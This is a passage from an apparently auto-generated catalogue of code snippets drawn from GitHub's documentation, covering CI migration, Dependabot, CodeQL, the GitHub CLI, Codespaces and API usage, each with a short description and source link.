executed. The `GIT_CHECKOUT` variable is set to \"true\", and the script contains an echo command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njob1:\n  variables:\n    GIT_CHECKOUT: \"true\"\n  script:\n    - echo \"Run your script here\"\n```\n\n----------------------------------------\n\nTITLE: GitHub OAuth Access Token URL for GitHub Enterprise Server\nDESCRIPTION: This code snippet shows the URL used to retrieve an OAuth access token in GitHub Enterprise Server (GHES). Applications need to use this URL as part of the OAuth flow. `HOSTNAME` represents the hostname of the specific GHES instance.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/making-your-github-app-available-for-github-enterprise-server.md#_snippet_3\n\nLANGUAGE: none\nCODE:\n```\n`https://github.com/login/oauth/access_token` | `https://HOSTNAME/login/oauth/access_token`\n```\n\n----------------------------------------\n\nTITLE: Injecting Enterprise Access Restriction Header\nDESCRIPTION: This code snippet shows the format of the header that needs to be injected into all traffic to supported GitHub.com endpoints when using Enterprise Managed Users (EMU). The `ENTERPRISE-ID` needs to be replaced with the actual enterprise ID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/restricting-access-to-githubcom-using-a-corporate-proxy.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nsec-GitHub-allowed-enterprise: ENTERPRISE-ID\n```\n\n----------------------------------------\n\nTITLE: Pushing container image with latest tag - Docker CLI\nDESCRIPTION: This command pushes a container image tagged with `latest` to the GitHub Container Registry. Replace `NAMESPACE` with the account or organization name, and `IMAGE_NAME` with the image's name. The command assumes that you have already built and tagged the image locally.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ndocker push {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n```\n\n----------------------------------------\n\nTITLE: Cloning a repository with Git\nDESCRIPTION: This snippet clones a repository from the migration origin using `git clone --mirror`. The `--mirror` option is used to create a full mirror of the repository, including all branches and tags, which is useful for migration purposes. This is a required step before using `git-sizer`.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/overview/planning-your-migration-to-github.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngit clone --mirror\n```\n\n----------------------------------------\n\nTITLE: Defining Metadata for a Workflow Template in JSON\nDESCRIPTION: This JSON snippet defines the metadata for a workflow template.  It specifies the workflow's name, description, icon, categories, and file patterns. The `filePatterns` array uses regular expressions to determine when the workflow is applicable to a repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-workflow-templates-for-your-organization.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"Octo Organization Workflow\",\n    \"description\": \"Octo Organization CI workflow template.\",\n    \"iconName\": \"example-icon\",\n    \"categories\": [\n        \"Go\"\n    ],\n    \"filePatterns\": [\n        \"package.json$\",\n        \"^Dockerfile\",\n        \".*\\\\.md$\"\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Targeting specific branches in Travis CI YAML\nDESCRIPTION: This snippet demonstrates how to configure Travis CI to run only on specific branches.  The `branches` key is used with the `only` keyword to list the branches on which the CI should execute.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nbranches:\n  only:\n    - main\n    - 'mona/octocat'\n```\n\n----------------------------------------\n\nTITLE: Making API request with body parameters using GitHub CLI\nDESCRIPTION: This example shows how to use the GitHub CLI to create a new issue in a repository using the /repos/{owner}/{repo}/issues endpoint.  It uses body parameters to specify the issue title and body, setting the Accept and X-GitHub-Api-Version headers.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngh api --method POST /repos/{% ifversion ghes %}REPO-OWNER/REPO-NAME{% else %}octocat/Spoon-Knife{% endif %}/issues \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"X-GitHub-Api-Version: 2022-11-28\" \\\n-f title='Created with the REST API' \\\n-f body='This is a test issue created by the REST API' \\\n```\n\n----------------------------------------\n\nTITLE: Dry-run Azure DevOps Build Pipeline Migration to GitHub Actions\nDESCRIPTION: This command performs a dry run of migrating an Azure DevOps build pipeline to a GitHub Actions workflow. It requires the pipeline ID and specifies an output directory for the converted workflow files and logs. The command does not create a pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run azure-devops pipeline --pipeline-id :pipeline_id --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Setting GitHub Config URL (GHES)\nDESCRIPTION: This snippet shows how to set the `githubConfigUrl` in the `values.yaml` file for GitHub Enterprise Server to deploy runner scale sets to a specific repository, organization, or enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\ngithubConfigUrl: \"http(s)://<HOSTNAME>/<'enterprises/your_enterprise'/'org'/'org/repo'>\"\n```\n\n----------------------------------------\n\nTITLE: Forwarding webhooks using smee-client\nDESCRIPTION: This command forwards webhooks from a specified smee.io URL to a local server. It sets the URL of the smee.io channel, the local path for the webhook endpoint (/webhook), and the port (3000) the local server listens on. Replace `WEBHOOK_PROXY_URL` with the URL obtained from smee.io.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nsmee --url WEBHOOK_PROXY_URL --path /webhook --port 3000\n```\n\n----------------------------------------\n\nTITLE: Customizing Commit Message Prefixes in Dependabot YAML\nDESCRIPTION: This YAML snippet demonstrates how to customize the commit message prefixes for Dependabot pull requests for multiple package ecosystems (npm, docker, composer, pip). It shows how to define prefixes for different dependency types (development vs. production) and how to include the scope of updated dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/customizing-dependabot-prs.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# Customize commit messages\n\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    commit-message:\n      # Prefix all commit messages with \"npm: \"\n      prefix: \"npm\"\n\n  - package-ecosystem: \"docker\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    commit-message:\n      # Prefix all commit messages with [docker] \" (no colon, but a trailing whitespace)\n      prefix: \"[docker] \"\n\n  - package-ecosystem: \"composer\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    # Prefix all commit messages with \"Composer\" plus its scope, that is, a\n    # list of updated dependencies\n    commit-message:\n      prefix: \"Composer\"\n      include: \"scope\"\n\n  - package-ecosystem: \"pip\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    # Include a list of updated dependencies\n    # with a prefix determined by the dependency group\n    commit-message:\n      prefix: \"pip prod\"\n      prefix-development: \"pip dev\"\n```\n\n----------------------------------------\n\nTITLE: Example PostgreSQL Query Output\nDESCRIPTION: This is the expected output in the console after successfully executing the Node.js script and querying the PostgreSQL database.  It shows the data inserted into the 'student' table, including the id, firstname, lastname, age, address, and email. The 'null' indicates that there were no errors during the query.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_7\n\nLANGUAGE: text\nCODE:\n```\nnull [ { id: 1,\n    firstname: 'Mona the',\n    lastname: 'Octocat',\n    age: 9,\n    address:\n     '88 Colin P Kelly Jr St, San Francisco, CA 94107, United States',\n    email: 'octocat@github.com' } ]\n```\n\n----------------------------------------\n\nTITLE: Fork repository with remote name using GitHub CLI\nDESCRIPTION: This command forks a repository and configures a remote connection to the upstream repository with a specified name, using the GitHub CLI.  It requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh repo fork REPOSITORY --remote-name \"main-remote-repo\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Minimum Number of Runners\nDESCRIPTION: This snippet configures a minimum number of runners by setting the `minRunners` property in the `values.yaml` file. ARC ensures that the specified number of runners are always active and available. The `maxRunners` property is commented out, allowing scaling beyond the minimum if needed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\n# maxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 20\n```\n\n----------------------------------------\n\nTITLE: Anchored Path Qualifier with Directory and Glob\nDESCRIPTION: This snippet demonstrates anchoring the glob expression to the start of the path using `/`. It searches for javascript files directly under the `/src` directory.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_17\n\nLANGUAGE: text\nCODE:\n```\npath:/src/*.js\n```\n\n----------------------------------------\n\nTITLE: CodeQL Pack Create Command\nDESCRIPTION: This shell command builds the contents of a QL package from source code. It takes a directory as input and creates a package in the specified output directory. The command supports options for setting threads, RAM, and controlling the compilation process.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-create.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack create [--output=<output>] [--threads=<num>] [--ram=<MB>] <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Config YAML composite actions\nDESCRIPTION: This YAML file configures the target repositories for converted composite actions during migration.  It specifies the name of the composite action, the target GitHub repository URL (`target_url`), and the branch or tag (`ref`) to use for the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\ncomposite_actions:\n  - name: my-composite-action.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions workflow using GitHub CLI\nDESCRIPTION: This YAML workflow uses the GitHub CLI within a GitHub Actions workflow to list repository issues. It authenticates using the GITHUB_TOKEN secret and interacts with the specified REST API endpoint.  Ensure the repository has the required 'issues: read' permission.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_dispatch:\njobs:\n  use_api:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: read\n    steps:\n      - env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n        run: |\n          gh api {% data variables.product.rest_url %}{% data variables.rest.example_request_url %}\n```\n\n----------------------------------------\n\nTITLE: Uninstalling Runner Service - macOS\nDESCRIPTION: Uninstalls the self-hosted runner service on macOS systems using `svc.sh`. Requires the user to be in the directory where the runner application is installed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\n./svc.sh uninstall\n```\n\n----------------------------------------\n\nTITLE: Display BQRS file metadata using codeql bqrs info\nDESCRIPTION: This command displays an overview of the data contained in the compact binary BQRS file that is the result of executing a query. It shows the names and sizes of each result set (table) in the BQRS file, and the column types of each result set.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/bqrs-info.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql bqrs info <options>... -- <file>\n```\n\n----------------------------------------\n\nTITLE: Pushing Local Changes to GitHub\nDESCRIPTION: Pushes the local changes from the local Git repository to the remote repository on GitHub. The `-u` flag sets the upstream branch for future `git pull` and `git push` commands. If your default branch is not named `main`, replace `main` with the name of your default branch.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit push -u origin main\n```\n\n----------------------------------------\n\nTITLE: Generating a new SSH key with email - Shell\nDESCRIPTION: This command generates a new SSH key using the ed25519 algorithm and associates it with the provided email address.  It's the standard command for creating SSH keys on systems that support the algorithm.  If ed25519 is not supported, RSA can be used as a fallback. The email is used as a label for the key.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nssh-keygen -t ed25519 -C \"your_email@example.com\"\n```\n\n----------------------------------------\n\nTITLE: Installing CodeQL Pack Dependencies\nDESCRIPTION: This shell command demonstrates how to install dependencies for a CodeQL pack using the `codeql pack install` command. This command is executed in the same directory as the `qlpack.yml` file and generates a `codeql-pack.lock.yml` file that specifies all the transitive dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack install\n```\n\n----------------------------------------\n\nTITLE: Installing a local extension\nDESCRIPTION: Installs the extension from the current directory using the `gh extension install .` command. This allows testing the extension locally before publishing it.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension install .\n```\n\n----------------------------------------\n\nTITLE: Configuring CodeQL Pack Registries\nDESCRIPTION: This snippet demonstrates how to configure the `qlconfig.yml` file to specify which container registry to use for CodeQL packs.  It associates packs with different registries based on package name patterns. The file defines registries for both GitHub.com and GitHub Enterprise Server.  \nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n- packages:\n  - 'codeql/*'\n  - 'other-org/*'\n  # {% data variables.product.prodname_container_registry %} on {% data variables.product.prodname_dotcom_the_website %}\n  url: https://ghcr.io/v2/\n- packages: '*'\n  # {% data variables.product.prodname_container_registry %} hosted at `{% data variables.enterprise.gh_enterprise_domain %}`\n  url: {% data variables.enterprise.gh_enterprise_container_registry %}\n```\n\n----------------------------------------\n\nTITLE: Fetching Git LFS Objects\nDESCRIPTION: Pulls in the Git Large File Storage (LFS) objects associated with the repository. This step is crucial when mirroring repositories that use LFS to store large files.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncd OLD-REPOSITORY\ngit lfs fetch --all\n```\n\n----------------------------------------\n\nTITLE: Upload Node.js tool cache workflow\nDESCRIPTION: This workflow uploads a tool cache for Node.js versions 14 and 16, designed for use with self-hosted runners that do not have internet access.  It first clears any existing tool cache, then sets up Node.js versions 14.x and 16.x. Finally it archives the tool cache and uploads it as a workflow artifact. Requires access to a repository on GitHub.com where workflows can be run.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/setting-up-the-tool-cache-on-self-hosted-runners-without-internet-access.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Upload Node.js 14 and 16 tool cache\non: push\njobs:\n  upload_tool_cache:\n    runs-on: ubuntu-22.04\n    steps:\n      - name: Clear any existing tool cache\n        run: |\n          mv \"{% raw %}${{ runner.tool_cache }}{% endraw %}\" \"${{ runner.tool_cache }}.old\"\n          mkdir -p \"{% raw %}${{ runner.tool_cache }}{% endraw %}\"\n      - name: Setup Node 14\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: 14.x\n      - name: Setup Node 16\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: 16.x\n      - name: Archive tool cache\n        run: |\n          cd \"{% raw %}${{ runner.tool_cache }}{% endraw %}\"\n          tar -czf tool_cache.tar.gz *\n      - name: Upload tool cache artifact\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          path: {% raw %}${{runner.tool_cache}}/tool_cache.tar.gz{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Excluding Specific Queries from CodeQL Analysis - YAML\nDESCRIPTION: This YAML snippet shows how to exclude specific queries from the CodeQL analysis. It uses the `query-filters` array with `exclude` filters, specifying the `id` of the queries to be excluded.  The `id` corresponds to the Rule ID found in the alert details page of the security tab.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\nquery-filters:\n  - exclude:\n      id: js/redundant-assignment\n  - exclude:\n      id: js/useless-assignment-to-local\n```\n\n----------------------------------------\n\nTITLE: Go Workflow Template (Self-Hosted)\nDESCRIPTION: This workflow defines a CI pipeline for Go projects, triggered on pushes to the `main` branch and pull requests targeting `main`. It sets up Go version 1.20, builds the project using `go build`, and runs tests using `go test` on a self-hosted runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-go.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Go\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\njobs:\n  build:\n\n    runs-on: self-hosted\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Set up Go\n        uses: {% data reusables.actions.action-setup-go %}\n        with:\n          go-version: '1.20'\n\n      - name: Build\n        run: go build -v ./...\n\n      - name: Test\n        run: go test -v ./...\n```\n\n----------------------------------------\n\nTITLE: Squashing commits and merging with GitHub CLI\nDESCRIPTION: This command shows how to squash commits into a single commit, merge it into the base branch, and delete both local and remote branches using the `gh pr merge` subcommand with specific flags. It avoids interactive prompts by specifying all necessary options.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/incorporating-changes-from-a-pull-request/merging-a-pull-request.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr merge 523 --squash --body \"my squash commit\" --delete-branch\n```\n\n----------------------------------------\n\nTITLE: Setting CodeQL environment variables using PowerShell\nDESCRIPTION: This PowerShell script reads a JSON file containing environment variables generated by CodeQL and sets them as Azure DevOps pipeline variables. It reads the JSON from `$(System.DefaultWorkingDirectory)/db/temp/tracingEnvironment/start-tracing.json` and sets each property in the JSON object as a pipeline variable using the `##vso[task.setvariable variable=]` command.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_23\n\nLANGUAGE: powershell\nCODE:\n```\nsteps:\n    # Read the generated environment variables and values,\n    # and set them so they are available for subsequent commands\n    # in the build pipeline. This is done in PowerShell in this example.\n    - task: PowerShell@1\n       displayName: Set {% data variables.product.prodname_codeql %} environment variables\n       inputs:\n          targetType: inline\n          script: >\n             $json = Get-Content $(System.DefaultWorkingDirectory)/db/temp/tracingEnvironment/start-tracing.json | ConvertFrom-Json\n             $json.PSObject.Properties | ForEach-Object {\n                 $template = \"##vso[task.setvariable variable=\"\n                 $template += $_.Name\n                 $template += \"]\"\n                 $template += $_.Value\n                 echo \"$template\"\n             }\n```\n\n----------------------------------------\n\nTITLE: Updating the `main` function in Ruby\nDESCRIPTION: This Ruby function `main` is the entry point of the CLI application. It parses the command-line arguments and calls the corresponding function. It supports `help`, `login`, and `whoami` commands. If an unknown command is given, it prints an error message.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\ndef main\n  case ARGV[0]\n  when \"help\"\n    help\n  when \"login\"\n    login\n  when \"whoami\"\n    whoami\n  else\n    puts \"Unknown command #{ARGV[0]}\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Python Index with Azure DevOps Token\nDESCRIPTION: This snippet configures access to a Python index on Azure DevOps using a username and token. It sets `replaces-base` to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_17\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  python-azure:\n    type: python-index\n    url: https://pkgs.dev.azure.com/octocat/_packaging/my-feed/pypi/example\n    username: octocat@example.com\n    password: ${{secrets.MY_AZURE_DEVOPS_TOKEN}}\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Defining a Core CodeQL Library Pack in YAML\nDESCRIPTION: This YAML snippet shows the `qlpack.yml` file for a core CodeQL library pack for C/C++.  It includes the pack's name, version, database schema (`dbscheme`), declares it as a library, and specifies a directory for database schema upgrades. The `dbscheme` and `upgrades` properties are typically internal to the CodeQL CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_27\n\nLANGUAGE: yaml\nCODE:\n```\nname: codeql/cpp-all\nversion: x.y.z-dev\ndbscheme: semmlecode.cpp.dbscheme\nlibrary: true\nupgrades: upgrades\n```\n\n----------------------------------------\n\nTITLE: Listing Assignments using GitHub CLI\nDESCRIPTION: This command lists the assignments for a given classroom.  It requires the GitHub CLI and the GitHub Classroom extension.  The output provides a list of assignments associated with the specified classroom in the console.\nSOURCE: https://github.com/github/docs/blob/main/content/education/manage-coursework-with-github-classroom/teach-with-github-classroom/using-github-classroom-with-github-cli.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh classroom assignments\n```\n\n----------------------------------------\n\nTITLE: Filtering and Sorting Python List with o3-mini\nDESCRIPTION: This snippet showcases how o3-mini can filter and sort a list of user dictionaries in Python. The code filters a list of users to include only active users and sorts them by their signup date. It utilizes list comprehension for filtering and the `sorted` function with a lambda expression for sorting. o3-mini is ideal for this task due to its speed and efficiency in handling simple filtering and sorting operations.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/ai-models/comparing-ai-models-using-different-tasks.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nusers = [\n    {\"name\": \"Alice\", \"active\": True, \"signup_date\": \"2023-12-10\"},\n    {\"name\": \"Bob\", \"active\": False, \"signup_date\": \"2023-11-05\"},\n    {\"name\": \"Charlie\", \"active\": True, \"signup_date\": \"2024-01-15\"}\n]\n```\n\nLANGUAGE: python\nCODE:\n```\n# Filter to only include active users\nactive_users = [user for user in users if user[\"active\"]]\n\n# Sort active users by signup_date\nactive_users_sorted = sorted(active_users, key=lambda user: user[\"signup_date\"])\n\nprint(active_users_sorted)\n```\n\n----------------------------------------\n\nTITLE: Configuring devcontainer.json with postCreateCommand\nDESCRIPTION: This snippet shows how to configure the `devcontainer.json` file to execute a script after the container is created. The script in this example is `postCreate.sh`, which handles symbolic linking.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/rebuilding-the-container-in-a-codespace.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"image\": \"mcr.microsoft.com/devcontainers/base:alpine\",\n    \"postCreateCommand\": \"chmod +x .devcontainer/postCreate.sh && .devcontainer/postCreate.sh\"\n}\n```\n\n----------------------------------------\n\nTITLE: Running a Single CodeQL Query\nDESCRIPTION: This example demonstrates how to run a single query over a CodeQL database. It shows both using the pack name and path, and directly specifying the path to the query file. Requires a JavaScript CodeQL database `<javascript-database>`.  Output is saved as `js-analysis/js-results.csv`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze --download <javascript-database> codeql/javascript-queries:Declarations/UnusedVariable.ql --format=csv --output=js-analysis/js-results.csv\n```\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze <javascript-database> ../ql/javascript/ql/src/Declarations/UnusedVariable.ql --format=csv --output=js-analysis/js-results.csv\n```\n\n----------------------------------------\n\nTITLE: Defining PinnedDiscussionPattern enum in GraphQL\nDESCRIPTION: Defines the `PinnedDiscussionPattern` enum, which represents preconfigured background patterns for styling pinned discussions. The enum includes values like `CHEVRON_UP`, `DOT`, `DOT_FILL`, `HEART_FILL`, `OCTOFACE`, and `PLUS`.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_10\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nPreconfigured background patterns that may be used to style discussions pinned within a repository.\n\"\"\"\nenum PinnedDiscussionPattern {\n  \"\"\"\n  An upward-facing chevron pattern\n  \"\"\"\n  CHEVRON_UP\n\n  \"\"\"\n  A hollow dot pattern\n  \"\"\"\n  DOT\n\n  \"\"\"\n  A solid dot pattern\n  \"\"\"\n  DOT_FILL\n\n  \"\"\"\n  A heart pattern\n  \"\"\"\n  HEART_FILL\n\n  \"\"\"\n  A friendly octocat face pattern\n  \"\"\"\n  OCTOFACE\n\n  \"\"\"\n  A plus sign pattern\n  \"\"\"\n  PLUS\n}\n\n```\n\n----------------------------------------\n\nTITLE: Importing App from Octokit.js\nDESCRIPTION: This snippet shows how to import the `App` class from the `octokit` library. This is a necessary step when using Octokit.js to authenticate as a GitHub App. Ensure `octokit` is installed before running.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { App } from \"octokit\";\n```\n\n----------------------------------------\n\nTITLE: Selecting GitHub Enterprise Server AMI using AWS CLI\nDESCRIPTION: This code snippet demonstrates how to use the AWS CLI to get a list of GitHub Enterprise Server images published by GitHub's AWS owner IDs. It uses the `aws ec2 describe-images` command to filter images by owner ID and then sorts and displays the image name and ID. Replace `OWNER_ID` with either `025577942450` (for GovCloud) or `895557238572` (for other regions).\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-aws.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\naws ec2 describe-images \\\n   --owners OWNER_ID \\\n   --query 'sort_by(Images,&Name)[*].{Name:Name,ImageID:ImageId}' \\\n   --output=text\n```\n\n----------------------------------------\n\nTITLE: Configure automatic file opening in devcontainer.json\nDESCRIPTION: This JSON snippet configures the codespace to automatically open specified files in the VS Code web client when a codespace is created. It adds a `customizations.codespaces.openFiles` property to the `devcontainer.json` file. The value of the `openFiles` property is an array of file paths relative to the repository root. The files are opened in the order specified.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/configuring-dev-containers/automatically-opening-files-in-the-codespaces-for-a-repository.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n   \"customizations\": {\n     \"codespaces\": {\n       \"openFiles\": [\n         \"README.md\",\n         \"scripts/tsconfig.json\",\n         \"docs/main/CODING_STANDARDS.md\"\n       ]\n     }\n   }\n```\n\n----------------------------------------\n\nTITLE: Specifying API Version with curl\nDESCRIPTION: This snippet demonstrates how to specify the API version using the `X-GitHub-Api-Version` header in a `curl` request.  It shows the basic structure of the command, including the header and the endpoint.  The specific API version is represented by the `{% data reusables.rest-api.version-header %}` placeholder.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/about-the-rest-api/api-versions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl {% data reusables.rest-api.version-header %} https://api.github.com/zen\n```\n\n----------------------------------------\n\nTITLE: Creating Extended Support Bundle using SSH (ghe-support-bundle -x)\nDESCRIPTION: This command uses SSH to connect to the GitHub Enterprise Server instance and executes the `ghe-support-bundle` command-line utility with the `-o` and `-x` options. The `-o` option specifies that the output should be written to stdout, which is then redirected to a file named `support-bundle.tgz`. The `-x` flag requests an extended support bundle containing logs from the past eight days. The `-p 122` option specifies the port for SSH, `admin@HOSTNAME` specifies the user and hostname of the server. This command requires SSH access to the server.\nSOURCE: https://github.com/github/docs/blob/main/content/support/contacting-github-support/providing-data-to-github-support.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-support-bundle -o -x' > support-bundle.tgz\n```\n\n----------------------------------------\n\nTITLE: Example: Adding Simple Job Summary using PowerShell\nDESCRIPTION: This PowerShell script adds a simple \"### Hello world! :rocket:\" message to the job summary by appending to the `$env:GITHUB_STEP_SUMMARY` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_45\n\nLANGUAGE: powershell\nCODE:\n```\n\"### Hello world! :rocket:\" >> 